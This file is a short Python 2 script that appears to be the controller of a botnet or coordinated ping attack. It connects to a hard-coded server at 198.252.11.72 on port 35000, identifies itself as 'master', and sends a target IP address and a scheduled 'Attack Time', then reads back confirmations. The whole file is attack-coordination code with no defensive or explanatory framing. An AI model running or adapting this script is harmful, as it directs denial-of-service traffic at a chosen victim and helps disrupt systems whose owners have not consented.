#!/usr/bin/python
import socket
import sys
import time

#DATA ENTRY
ipAddr = '192.168.4.161'
ping_time_str = "2013-04-03-15-21-0"

#Create a TCP/IP socket
soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

my_address = socket.gethostbyname(socket.gethostname())

print>>sys.stderr,'My IP Address: %s' %my_address

#Connect the socket to the port where the server is listening
server_address = ('198.252.11.72', 35000)
print >>sys.stderr, 'Connecting to: %s => Port: %s' % server_address
soc.connect(server_address)

try:
	#send data
	message = 'master'
	print >>sys.stderr, 'Sending: "%s"' % message
	soc.sendall(message)
	time.sleep(1)
	print >>sys.stderr, 'Sending New IP Address: %s' %ipAddr
	soc.sendall(ipAddr)
	time.sleep(1)
	print >>sys.stderr, 'Sending Attack Time: %s' %ping_time_str
	soc.sendall(ping_time_str)
	confirmIp = soc.recv(1024)
	confirmPingTime = soc.recv(1024)
	print >>sys.stderr, confirmIp
	print >>sys.stderr, confirmPingTime

finally:
	print >>sys.stderr, 'Closing Socket'
	soc.close()
